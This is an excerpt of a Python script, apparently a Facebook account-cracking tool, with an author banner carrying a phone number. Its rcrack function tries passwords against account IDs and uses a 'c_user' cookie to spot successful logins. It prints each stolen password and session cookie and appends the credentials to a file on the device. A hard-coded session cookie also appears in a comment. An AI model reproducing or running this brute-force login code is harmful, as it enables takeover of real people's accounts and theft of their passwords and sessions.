...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100047752044014&mibextid=ZbWKwL')
logo =("""
...
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mRJ Hridoy Sarker\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> RJ Hridoy Sarker        ║  \033[1;97m
╠══[Github:=======================> \33[1;38mMATAL-BREND       ║\33[1;34m
╠══[Whatsapp:=====================> 01887527509    ║\33[1;35m
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=N6wiZO9M5V4EBhxo-0FXAT55; sb=N6wiZAIS14c3xqA2ZIVb8wbQ; m_pixel_ratio=2; wd=360x672; fr=05r9oslWjmVPWjtAU..BkKXb2.8m.AAA.0.0.BkKXco.AWUTZ_6NTzs',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Hridoy💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Ridoy-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
